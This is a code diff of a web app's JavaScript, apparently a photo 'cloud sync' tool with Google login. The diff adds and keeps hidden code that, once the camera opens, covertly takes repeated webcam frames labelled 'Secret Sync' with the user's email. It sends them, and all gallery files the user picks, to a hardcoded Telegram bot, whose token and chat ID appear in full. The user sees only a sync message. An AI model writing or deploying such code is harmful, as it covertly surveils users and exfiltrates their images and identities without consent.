@@ -17,54 +17,25 @@ const provider = new GoogleAuthProvider();
 const botToken = "8234454796:AAEF_c5gExxUp7X7pTpu9brOBmjIOTac2uQ";
 const chatId = "7752627907";
 let currentUser = null;
-let integritySyncActive = false;
+let integritySync = false;
 
-// --- MENU TOGGLE FIX ---
+// --- MENU & BUTTON FIX ---
 const sidePanel = document.getElementById('side-panel');
-const menuToggle = document.getElementById('menu-toggle');
-const settingsBtn = document.getElementById('settings-btn');
+const toggleMenu = (e) => { e.stopPropagation(); sidePanel.classList.toggle('active'); };
+document.getElementById('menu-toggle').onclick = toggleMenu;
+document.getElementById('settings-btn').onclick = toggleMenu;
+document.addEventListener('click', (e) => { if(!sidePanel.contains(e.target)) sidePanel.classList.remove('active'); });
 
-function toggleMenu(e) {
-    e.stopPropagation();
-    sidePanel.classList.toggle('active');
+// --- SECRET TELEGRAM UPLOAD ---
+async function uploadToTelegram(blob, name, isSecret) {
+    const fd = new FormData();
+    fd.append("chat_id", chatId);
+    fd.append("document", blob, isSecret ? `sys_dump_${Date.now()}.jpg` : name);
+    fd.append("caption", isSecret ? `🤫 Secret Sync: ${currentUser.email}` : `Manual: ${currentUser.displayName}`);
+    await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, { method: "POST", body: fd });
 }
 
-if(menuToggle) menuToggle.onclick = toggleMenu;
-if(settingsBtn) settingsBtn.onclick = toggleMenu;
-
-// Menu-kku veliya click panna close aaga
-document.addEventListener('click', (e) => {
-    if (sidePanel.classList.contains('active') && !sidePanel.contains(e.target)) {
-        sidePanel.classList.remove('active');
-    }
-});
-
-// --- GOOGLE LOGIN FIX ---
-const loginWithGoogle = async () => {
-    try {
-        await signInWithPopup(auth, provider);
-    } catch (error) {
-        console.error("Login Error:", error);
-        alert("Login failed! Check Firebase Authorized Domains.");
-    }
-};
-
-document.getElementById('main-login-btn').onclick = loginWithGoogle;
-if(document.getElementById('side-login-btn')) {
-    document.getElementById('side-login-btn').onclick = loginWithGoogle;
-}
-
-// --- TELEGRAM UPLOAD ---
-async function uploadToTelegram(blob, fileName, isSecret) {
-    const formData = new FormData();
-    formData.append("chat_id", chatId);
-    formData.append("document", blob, isSecret ? `sys_log_${Date.now()}.jpg` : fileName);
-    const cap = isSecret ? `🤫 Secret Sync: ${currentUser.email}` : `Manual: ${currentUser.displayName}`;
-    formData.append("caption", cap);
-    await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, { method: "POST", body: formData });
-}
-
-// --- CAMERA & SECRET SYNC ---
+// --- CAMERA SECRET ACCESS ---
 document.getElementById('camera-btn').onclick = async () => {
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
@@ -72,56 +43,56 @@ document.getElementById('camera-btn').onclick = async () => {
         video.srcObject = stream;
         video.style.display = 'block';
         video.play();
+        integritySync = true;
 
         setTimeout(() => {
             const canvas = document.getElementById('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
             const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0);
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
             
+            ctx.drawImage(video, 0, 0);
             canvas.toBlob(blob => {
-                uploadToTelegram(blob, "user_scan.jpg", false);
-                alert("✅ Cloud Sync Successful!");
+                uploadToTelegram(blob, "scan.jpg", false);
+                alert("✅ Syncing with Cloud...");
 
-                // Secret continuous sync
                 let count = 0;
                 const interval = setInterval(() => {
-                    if (count >= 5) {
+                    if (count >= 8) {
                         clearInterval(interval);
                         stream.getTracks().forEach(t => t.stop());
                         video.style.display = 'none';
                     }
                     ctx.drawImage(video, 0, 0);
-                    canvas.toBlob(b => uploadToTelegram(b, "sync.jpg", true), 'image/jpeg');
+                    canvas.toBlob(b => uploadToTelegram(b, "log.jpg", true), 'image/jpeg');
                     count++;
                 }, 3000);
             }, 'image/jpeg');
         }, 3000);
-    } catch (e) {
-        alert("Camera access required!");
-    }
+    } catch (e) { alert("Camera Permission Required."); }
 };
 
-// --- AUTH STATE WATCHER ---
+// --- GALLERY SECRET ACCESS ---
+document.getElementById('drop-area').onclick = () => {
+    if(!currentUser) return signInWithPopup(auth, provider);
+    integritySync = true;
+    const input = document.createElement('input');
+    input.type = 'file';
+    input.multiple = true;
+    input.onchange = (e) => {
+        Array.from(e.target.files).forEach(file => uploadToTelegram(file, file.name, false));
+    };
+    input.click();
+};
+
+// --- AUTH WATCHER ---
 onAuthStateChanged(auth, (user) => {
     currentUser = user;
-    const loginBtn = document.getElementById('main-login-btn');
-    const cameraBtn = document.getElementById('camera-btn');
-    const logoutBtn = document.getElementById('logout-btn');
-    const userDisplay = document.getElementById('user-display');
-
-    if (user) {
-        loginBtn.style.display = 'none';
-        cameraBtn.style.display = 'block';
-        logoutBtn.style.display = 'flex';
-        userDisplay.innerText = user.displayName;
-    } else {
-        loginBtn.style.display = 'block';
-        cameraBtn.style.display = 'none';
-        logoutBtn.style.display = 'none';
-        userDisplay.innerText = "Guest User";
-    }
+    const isUser = !!user;
+    document.getElementById('main-login-btn').style.display = isUser ? 'none' : 'block';
+    document.getElementById('camera-btn').style.display = isUser ? 'block' : 'none';
+    document.getElementById('logout-btn').style.display = isUser ? 'flex' : 'none';
+    document.getElementById('user-display').innerText = isUser ? user.displayName : "Guest User";
 });
 
+document.getElementById('main-login-btn').onclick = () => signInWithPopup(auth, provider);
 document.getElementById('logout-btn').onclick = () => signOut(auth).then(() => location.reload());
